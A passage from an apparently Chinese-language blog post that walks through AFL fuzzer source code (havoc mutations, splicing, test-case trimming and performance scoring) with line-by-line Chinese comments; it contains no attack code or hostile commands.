extras[use_extra].len;<br>              u32 insert_at;<br><br>              <span class="hljs-keyword">if</span> (extra_len &gt; temp_len) <span class="hljs-keyword">break</span>;<br><br>              insert_at = UR(temp_len - extra_len + <span class="hljs-number">1</span>);<br>              <span class="hljs-built_in">memcpy</span>(out_buf + insert_at, extras[use_extra].data, extra_len);<br><br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br><br>          &#125;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>: &#123;      <span class="hljs-comment">// 随机插入token</span><br><br>            u32 use_extra, extra_len, insert_at = UR(temp_len + <span class="hljs-number">1</span>);<br>            u8* new_buf;<br><br>            <span class="hljs-comment">/* Insert an extra. Do the same dice-rolling stuff as for the</span><br><span class="hljs-comment">               previous case. */</span><br><br>            <span class="hljs-keyword">if</span> (!extras_cnt || (a_extras_cnt &amp;&amp; UR(<span class="hljs-number">2</span>))) &#123;<br><br>              use_extra = UR(a_extras_cnt);<br>              extra_len = a_extras[use_extra].len;<br><br>              <span class="hljs-keyword">if</span> (temp_len + extra_len &gt;= MAX_FILE) <span class="hljs-keyword">break</span>;<br><br>              new_buf = ck_alloc_nozero(temp_len + extra_len);<br><br>              <span class="hljs-comment">/* Head */</span><br>              <span class="hljs-built_in">memcpy</span>(new_buf, out_buf, insert_at);<br><br>              <span class="hljs-comment">/* Inserted part */</span><br>              <span class="hljs-built_in">memcpy</span>(new_buf + insert_at, a_extras[use_extra].data, extra_len);<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br><br>              use_extra = UR(extras_cnt);<br>              extra_len = extras[use_extra].len;<br><br>              <span class="hljs-keyword">if</span> (temp_len + extra_len &gt;= MAX_FILE) <span class="hljs-keyword">break</span>;<br><br>              new_buf = ck_alloc_nozero(temp_len + extra_len);<br><br>              <span class="hljs-comment">/* Head */</span><br>              <span class="hljs-built_in">memcpy</span>(new_buf, out_buf, insert_at);<br><br>              <span class="hljs-comment">/* Inserted part */</span><br>              <span class="hljs-built_in">memcpy</span>(new_buf + insert_at, extras[use_extra].data, extra_len);<br><br>            &#125;<br><br>            <span class="hljs-comment">/* Tail */</span><br>            <span class="hljs-built_in">memcpy</span>(new_buf + insert_at + extra_len, out_buf + insert_at,<br>                   temp_len - insert_at);<br><br>            ck_free(out_buf);<br>            out_buf   = new_buf;<br>            temp_len += extra_len;<br><br>            <span class="hljs-keyword">break</span>;<br><br>          &#125;<br><br>      &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, temp_len))<br>      <span class="hljs-keyword">goto</span> abandon_entry;<br><br>    <span class="hljs-comment">/* out_buf might have been mangled a bit, so let&#x27;s restore it to its</span><br><span class="hljs-comment">       original size and shape. */</span><br><br>    <span class="hljs-keyword">if</span> (temp_len &lt; len) out_buf = ck_realloc(out_buf, len);<br>    temp_len = len;<br>    <span class="hljs-built_in">memcpy</span>(out_buf, in_buf, len);       <span class="hljs-comment">// 恢复out_buf</span><br><br>    <span class="hljs-comment">/* If we&#x27;re finding new stuff, let&#x27;s run for a bit longer, limits</span><br><span class="hljs-comment">       permitting. */</span><br><br>    <span class="hljs-keyword">if</span> (queued_paths != havoc_queued) &#123; <span class="hljs-comment">// 发现了新路径</span><br><br>      <span class="hljs-keyword">if</span> (perf_score &lt;= HAVOC_MAX_MULT * <span class="hljs-number">100</span>) &#123;<br>        stage_max  *= <span class="hljs-number">2</span>;<br>        perf_score *= <span class="hljs-number">2</span>;<br>      &#125;<br><br>      havoc_queued = queued_paths;<br><br>    &#125;<br><br>  &#125;<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  <span class="hljs-keyword">if</span> (!splice_cycle) &#123;  <span class="hljs-comment">// HAVOC</span><br>    stage_finds[STAGE_HAVOC]  += new_hit_cnt - orig_hit_cnt;<br>    stage_cycles[STAGE_HAVOC] += stage_max;<br>  &#125; <span class="hljs-keyword">else</span> &#123;      <span class="hljs-comment">// SPLICE</span><br>    stage_finds[STAGE_SPLICE]  += new_hit_cnt - orig_hit_cnt;<br>    stage_cycles[STAGE_SPLICE] += stage_max;<br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> IGNORE_FINDS</span><br></code></pre></td></tr></table></figure><h4 id="SPLICING"><a href="#SPLICING" class="headerlink" title="SPLICING"></a>SPLICING</h4><p>拼接测试用例，重新进行Random Havoc。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">/************</span><br><span class="hljs-comment">   * SPLICING *         // spling</span><br><span class="hljs-comment">   ************/</span><br><br>  <span class="hljs-comment">/* This is a last-resort strategy triggered by a full round with no findings.</span><br><span class="hljs-comment">     It takes the current input file, randomly selects another input, and</span><br><span class="hljs-comment">     splices them together at some offset, then relies on the havoc</span><br><span class="hljs-comment">     code to mutate that blob. */</span><br><br>retry_splicing:         <span class="hljs-comment">// 拼接测试用例，重新Random Havoc</span><br><br>  <span class="hljs-keyword">if</span> (use_splicing &amp;&amp; splice_cycle++ &lt; SPLICE_CYCLES &amp;&amp;<br>      queued_paths &gt; <span class="hljs-number">1</span> &amp;&amp; queue_cur-&gt;len &gt; <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// 若</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>* <span class="hljs-title">target</span>;</span><br>    u32 tid, split_at;<br>    u8* new_buf;<br>    s32 f_diff, l_diff;<br><br>    <span class="hljs-comment">/* First of all, if we&#x27;ve modified in_buf for havoc, let&#x27;s clean that</span><br><span class="hljs-comment">       up... */</span><br><br>    <span class="hljs-keyword">if</span> (in_buf != orig_in) &#123;    <span class="hljs-comment">// 恢复in_buf</span><br>      ck_free(in_buf);<br>      in_buf = orig_in;<br>      len = queue_cur-&gt;len;<br>    &#125;<br><br>    <span class="hljs-comment">/* Pick a random queue entry and seek to it. Don&#x27;t splice with yourself. */</span><br><br>    <span class="hljs-keyword">do</span> &#123; tid = UR(queued_paths); &#125; <span class="hljs-keyword">while</span> (tid == current_entry);        <span class="hljs-comment">// 随机挑选目标</span><br><br>    splicing_with = tid;<br>    target = <span class="hljs-built_in">queue</span>;<br><br>    <span class="hljs-keyword">while</span> (tid &gt;= <span class="hljs-number">100</span>) &#123; target = target-&gt;next_100; tid -= <span class="hljs-number">100</span>; &#125;       <span class="hljs-comment">// 纠正tid取值，选取合适的target</span><br>    <span class="hljs-keyword">while</span> (tid--) target = target-&gt;next;<br><br>    <span class="hljs-comment">/* Make sure that the target has a reasonable length. */</span><br><br>    <span class="hljs-keyword">while</span> (target &amp;&amp; (target-&gt;len &lt; <span class="hljs-number">2</span> || target == queue_cur)) &#123;        <span class="hljs-comment">// 选取合适的target</span><br>      target = target-&gt;next;<br>      splicing_with++;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!target) <span class="hljs-keyword">goto</span> retry_splicing;<br><br>    <span class="hljs-comment">/* Read the testcase into a new buffer. */</span><br><br>    fd = open(target-&gt;fname, O_RDONLY); <span class="hljs-comment">// 打开target-&gt;fname</span><br><br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, target-&gt;fname);<br><br>    new_buf = ck_alloc_nozero(target-&gt;len);     <span class="hljs-comment">// 为new_buf分配空间</span><br><br>    ck_read(fd, new_buf, target-&gt;len, target-&gt;fname);   <span class="hljs-comment">// 将文件内容读取到new_buf中</span><br><br>    close(fd);<br><br>    <span class="hljs-comment">/* Find a suitable splicing location, somewhere between the first and</span><br><span class="hljs-comment">       the last differing byte. Bail out if the difference is just a single</span><br><span class="hljs-comment">       byte or so. */</span><br><br>    locate_diffs(in_buf, new_buf, MIN(len, target-&gt;len), &amp;f_diff, &amp;l_diff);<br><br>    <span class="hljs-keyword">if</span> (f_diff &lt; <span class="hljs-number">0</span> || l_diff &lt; <span class="hljs-number">2</span> || f_diff == l_diff) &#123; <span class="hljs-comment">// 判断splice是否合法</span><br>      ck_free(new_buf);<br>      <span class="hljs-keyword">goto</span> retry_splicing;<br>    &#125;<br><br>    <span class="hljs-comment">/* Split somewhere between the first and last differing byte. */</span><br><br>    split_at = f_diff + UR(l_diff - f_diff);    <span class="hljs-comment">// 随机选取位置切割new_buf</span><br><br>    <span class="hljs-comment">/* Do the thing. */</span><br><br>    len = target-&gt;len;<br>    <span class="hljs-built_in">memcpy</span>(new_buf, in_buf, split_at);<br>    in_buf = new_buf;<br><br>    ck_free(out_buf);<br>    out_buf = ck_alloc_nozero(len);<br>    <span class="hljs-built_in">memcpy</span>(out_buf, in_buf, len);       <span class="hljs-comment">// 拼接out_buf和new_buf</span><br><br>    <span class="hljs-keyword">goto</span> havoc_stage;   <span class="hljs-comment">// 跳转到havoc_stage，进行havoc</span><br><br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* !IGNORE_FINDS */</span></span><br><br></code></pre></td></tr></table></figure><h4 id="后期收尾阶段"><a href="#后期收尾阶段" class="headerlink" title="后期收尾阶段"></a>后期收尾阶段</h4><p>设置fuzz标志位，取消映射，释放缓冲区。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">  ret_val = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 设置ret_val为0</span><br><br>abandon_entry:<br><br>  splicing_with = <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-comment">/* Update pending_not_fuzzed count if we made it through the calibration</span><br><span class="hljs-comment">     cycle and have not seen this entry before. */</span><br>  <br>  <span class="hljs-comment">// 若stop_soon为空，且cal_failed为空，was_fuzzed为空</span><br>  <span class="hljs-keyword">if</span> (!stop_soon &amp;&amp; !queue_cur-&gt;cal_failed &amp;&amp; !queue_cur-&gt;was_fuzzed) &#123;<br>    queue_cur-&gt;was_fuzzed = <span class="hljs-number">1</span>;  <span class="hljs-comment">// 设置was_fuzzed为1，表示已经fuzz过</span><br>    pending_not_fuzzed--;       <span class="hljs-comment">// pending_noe_fuzzed - 1</span><br>    <span class="hljs-keyword">if</span> (queue_cur-&gt;favored) pending_favored--;  <span class="hljs-comment">// pending_favored - 1</span><br>  &#125;<br><br>  munmap(orig_in, queue_cur-&gt;len);      <span class="hljs-comment">// 取消文件映射</span><br><br>  <span class="hljs-keyword">if</span> (in_buf != orig_in) ck_free(in_buf);       <span class="hljs-comment">// 释放缓冲区</span><br>  ck_free(out_buf);<br>  ck_free(eff_map);<br><br>  <span class="hljs-keyword">return</span> ret_val;<br><br><span class="hljs-meta">#<span class="hljs-keyword">undef</span> FLIP_BIT</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="trim-case"><a href="#trim-case" class="headerlink" title="trim_case"></a>trim_case</h3><p>对测试用例进行剪枝，找到最小的符合原来路径的输入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Trim all new test cases to save cycles when doing deterministic checks. The</span><br><span class="hljs-comment">   trimmer uses power-of-two increments somewhere between 1/16 and 1/1024 of</span><br><span class="hljs-comment">   file size, to keep the stage short and sweet. */</span><br><br><span class="hljs-type">static</span> u8 <span class="hljs-title function_">trim_case</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv, <span class="hljs-keyword">struct</span> queue_entry* q, u8* in_buf)</span> &#123;<br><br>  <span class="hljs-type">static</span> u8 tmp[<span class="hljs-number">64</span>];<br>  <span class="hljs-type">static</span> u8 clean_trace[MAP_SIZE];<br><br>  u8  needs_write = <span class="hljs-number">0</span>, fault = <span class="hljs-number">0</span>;<br>  u32 trim_exec = <span class="hljs-number">0</span>;<br>  u32 remove_len;<br>  u32 len_p2;<br><br>  <span class="hljs-comment">/* Although the trimmer will be less useful when variable behavior is</span><br><span class="hljs-comment">     detected, it will still work to some extent, so we don&#x27;t check for</span><br><span class="hljs-comment">     this. */</span><br><br>  <span class="hljs-keyword">if</span> (q-&gt;len &lt; <span class="hljs-number">5</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;     <span class="hljs-comment">// 若queue的长度小于5，直接返回</span><br><br>  stage_name = tmp;<br>  bytes_trim_in += q-&gt;len;      <span class="hljs-comment">// 保存trim的字节总数</span><br><br>  <span class="hljs-comment">/* Select initial chunk len, starting with large steps. */</span><br><br>  len_p2 = next_p2(q-&gt;len);     <span class="hljs-comment">// 查找q-&gt;len的下一个2的幂</span><br><br>  remove_len = MAX(len_p2 / TRIM_START_STEPS, TRIM_MIN_BYTES);  <span class="hljs-comment">// 取len_p2 / 16 或者4之间最大的作为初始步长</span><br><br>  <span class="hljs-comment">/* Continue until the number of steps gets too high or the stepover</span><br><span class="hljs-comment">     gets too small. */</span><br><br>  <span class="hljs-keyword">while</span> (remove_len &gt;= MAX(len_p2 / TRIM_END_STEPS, TRIM_MIN_BYTES)) &#123;  <span class="hljs-comment">// 若remove_len大于等于len_p2 / 1024或者4</span><br><br>    u32 remove_pos = remove_len;<br><br>    <span class="hljs-built_in">sprintf</span>(tmp, <span class="hljs-string">&quot;trim %s/%s&quot;</span>, DI(remove_len), DI(remove_len));<br><br>    stage_cur = <span class="hljs-number">0</span>;<br>    stage_max = q-&gt;len / remove_len;    <span class="hljs-comment">// 计算最多阶段数量</span><br><br>    <span class="hljs-keyword">while</span> (remove_pos &lt; q-&gt;len) &#123;       <span class="hljs-comment">// 每次循环remove_len步长，直到遍历整个文件</span><br><br>      u32 trim_avail = MIN(remove_len, q-&gt;len - remove_pos);<br>      u32 cksum;<br>      <span class="hljs-comment">// 从in_buf开始，写入remove_pos字节，然后跳过remove_pos + trim_avail字节，写入到out_file(.cur_input)中</span><br>      write_with_gap(in_buf, q-&gt;len, remove_pos, trim_avail);<br><br>      fault = run_target(argv, exec_tmout);     <span class="hljs-comment">// 执行目标程序</span><br>      trim_execs++;<br><br>      <span class="hljs-keyword">if</span> (stop_soon || fault == FAULT_ERROR) <span class="hljs-keyword">goto</span> abort_trimming;       <span class="hljs-comment">// 若stop_soon不为空，或者fault为错误，跳转到abort_trimming</span><br><br>      <span class="hljs-comment">/* Note that we don&#x27;t keep track of crashes or hangs here; maybe TODO? */</span><br><br>      cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);<br><br>      <span class="hljs-comment">/* If the deletion had no impact on the trace, make it permanent. This</span><br><span class="hljs-comment">         isn&#x27;t perfect for variable-path inputs, but we&#x27;re just making a</span><br><span class="hljs-comment">         best-effort pass, so it&#x27;s not a big deal if we end up with false</span><br><span class="hljs-comment">         negatives every now and then. */</span><br><br>      <span class="hljs-keyword">if</span> (cksum == q-&gt;exec_cksum) &#123;     <span class="hljs-comment">// 判断cksum与q-&gt;exec_cksum，即判断是否产生了新的路径</span><br>                                        <span class="hljs-comment">// 若没有产生新的路径，进行剪枝操作</span><br><br>        u32 move_tail = q-&gt;len - remove_pos - trim_avail;<br><br>        q-&gt;len -= trim_avail;   <span class="hljs-comment">// 从q-&gt;len中减去trim_avail</span><br>        len_p2  = next_p2(q-&gt;len);      <span class="hljs-comment">//  继续找q-&gt;len的下一个2的幂</span><br><br>        memmove(in_buf + remove_pos, in_buf + remove_pos + trim_avail, <br>                move_tail);     <span class="hljs-comment">// 从in_buf[remove_pos]开始，删除trim_avail个字节</span><br><br>        <span class="hljs-comment">/* Let&#x27;s save a clean trace, which will be needed by</span><br><span class="hljs-comment">           update_bitmap_score once we&#x27;re done with the trimming stuff. */</span><br><br>        <span class="hljs-keyword">if</span> (!needs_write) &#123;     <span class="hljs-comment">// 若needs_write为空，设置needs_write为1</span><br><br>          needs_write = <span class="hljs-number">1</span>;<br>          <span class="hljs-built_in">memcpy</span>(clean_trace, trace_bits, MAP_SIZE);    <span class="hljs-comment">// 保存当前trace_bits到clean_trace中，便于后续恢复</span><br><br>        &#125;<br><br>      &#125; <span class="hljs-keyword">else</span> remove_pos += remove_len;<br><br>      <span class="hljs-comment">/* Since this can be slow, update the screen every now and then. */</span><br><br>      <span class="hljs-keyword">if</span> (!(trim_exec++ % stats_update_freq)) show_stats();     <span class="hljs-comment">// 若达到了stats_update_freq的倍数，显示stat</span><br>      stage_cur++;<br><br>    &#125;<br><br>    remove_len &gt;&gt;= <span class="hljs-number">1</span>;   <span class="hljs-comment">// remove_len / 2</span><br><br>  &#125;<br><br>  <span class="hljs-comment">/* If we have made changes to in_buf, we also need to update the on-disk</span><br><span class="hljs-comment">     version of the test case. */</span><br><br>  <span class="hljs-keyword">if</span> (needs_write) &#123;    <span class="hljs-comment">// 若needs_write不为空</span><br><br>    s32 fd;<br><br>    unlink(q-&gt;fname); <span class="hljs-comment">/* ignore errors */</span><br><br>    fd = open(q-&gt;fname, O_WRONLY | O_CREAT | O_EXCL, <span class="hljs-number">0600</span>);     <span class="hljs-comment">// 以只写模式打开q-&gt;fname</span><br><br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, q-&gt;fname);<br><br>    ck_write(fd, in_buf, q-&gt;len, q-&gt;fname);     <span class="hljs-comment">// 将in_buf写入fname文件中</span><br>    close(fd);<br><br>    <span class="hljs-built_in">memcpy</span>(trace_bits, clean_trace, MAP_SIZE);  <span class="hljs-comment">// 恢复trace_bits的值</span><br>    update_bitmap_score(q);<br><br>  &#125;<br><br>abort_trimming:<br><br>  bytes_trim_out += q-&gt;len;<br>  <span class="hljs-keyword">return</span> fault;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="calculate-score"><a href="#calculate-score" class="headerlink" title="calculate_score"></a>calculate_score</h3><p>根据queue entry的执行速度、覆盖到的path数和路径深度来评估出一个得分，这个得分perf_score在后面havoc的时候使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Calculate case desirability score to adjust the length of havoc fuzzing.</span><br><span class="hljs-comment">   A helper function for fuzz_one(). Maybe some of these constants should</span><br><span class="hljs-comment">   go into config.h. */</span><br><br><span class="hljs-type">static</span> u32 <span class="hljs-title function_">calculate_score</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> queue_entry* q)</span> &#123;<br><br>  u32 avg_exec_us = total_cal_us / total_cal_cycles;    <span class="hljs-comment">// 计算每轮平均执行时间</span><br>  u32 avg_bitmap_size = total_bitmap_size / total_bitmap_entries;       <span class="hljs-comment">// 计算每轮平均bitmap带线啊哦</span><br>  u32 perf_score = <span class="hljs-number">100</span>; <span class="hljs-comment">// 设置初始值perf_score为100</span><br><br>  <span class="hljs-comment">/* Adjust score based on execution speed of this path, compared to the</span><br><span class="hljs-comment">     global average. Multiplier ranges from 0.1x to 3x. Fast inputs are</span><br><span class="hljs-comment">     less expensive to fuzz, so we&#x27;re giving them more air time. */</span><br>  <br>  <span class="hljs-comment">// 根据执行时间与avg_exec_us的大小，更新perf_score</span><br>  <span class="hljs-keyword">if</span> (q-&gt;exec_us * <span class="hljs-number">0.1</span> &gt; avg_exec_us) perf_score = <span class="hljs-number">10</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q-&gt;exec_us * <span class="hljs-number">0.25</span> &gt; avg_exec_us) perf_score = <span class="hljs-number">25</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q-&gt;exec_us * <span class="hljs-number">0.5</span> &gt; avg_exec_us) perf_score = <span class="hljs-number">50</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q-&gt;exec_us * <span class="hljs-number">0.75</span> &gt; avg_exec_us) perf_score = <span class="hljs-number">75</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q-&gt;exec_us * <span class="hljs-number">4</span> &lt; avg_exec_us) perf_score = <span class="hljs-number">300</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q-&gt;exec_us * <span class="hljs-number">3</span> &lt; avg_exec_us) perf_score = <span class="hljs-number">200</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q-&gt;exec_us * <span class="hljs-number">2</span> &lt; avg_exec_us) perf_score = <span class="hljs-number">150</span>;<br><br>  <span class="hljs-comment">/* Adjust score based on bitmap size. The working theory is that better</span><br><span class="hljs-comment">     coverage translates to better targets. Multiplier from 0.25x to 3x. */</span><br>  <br>  <span class="hljs-comment">// 根据当前queue的bitmap_size与avg_bitmap_size的大小，更新perf_score</span><br>  <span class="hljs-keyword">if</span> (q-&gt;bitmap_size * <span class="hljs-number">0.3</span> &gt; avg_bitmap_size) perf_score *= <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q-&gt;bitmap_size * <span class="hljs-number">0.5</span> &gt; avg_bitmap_size) perf_score *= <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q-&gt;bitmap_size * <span class="hljs-number">0.75</span> &gt; avg_bitmap_size) perf_score *= <span class="hljs-number">1.5</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q-&gt;bitmap_size * <span class="hljs-number">3</span> &lt; avg_bitmap_size) perf_score *= <span class="hljs-number">0.25</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q-&gt;bitmap_size * <span class="hljs-number">2</span> &lt; avg_bitmap_size) perf_score *= <span class="hljs-number">0.5</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q-&gt;bitmap_size * <span class="hljs-number">1.5</span> &lt; avg_bitmap_size) perf_score *= <span class="hljs-number">0.75</span>;<br><br>  <span class="hljs-comment">/* Adjust score based on handicap. Handicap is proportional to how late</span><br><span class="hljs-comment">     in the game we learned about this path. Latecomers are allowed to run</span><br><span class="hljs-comment">     for a bit longer until they catch up with the rest. */</span><br><br>  <span class="hljs-keyword">if</span> (q-&gt;handicap &gt;= <span class="hljs-number">4</span>) &#123;<br><br>    perf_score *= <span class="hljs-number">4</span>;<br>    q-&gt;handicap -= <span class="hljs-number">4</span>;<br><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q-&gt;handicap) &#123;<br><br>    perf_score *= <span class="hljs-number">2</span>;<br>    q-&gt;handicap--;<br><br>  &#125;<br><br>  <span class="hljs-comment">/* Final adjustment based on input depth, under the assumption that fuzzing</span><br><span class="hljs-comment">     deeper test cases is more likely to reveal stuff that can&#x27;t be</span><br><span class="hljs-comment">     discovered with traditional fuzzers. */</span><br>  <br>  <span class="hljs-comment">// 根据当前q-depth落入的区间，更新perf_score</span><br>  <span class="hljs-keyword">switch</span> (q-&gt;depth) &#123;<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span> ... <span 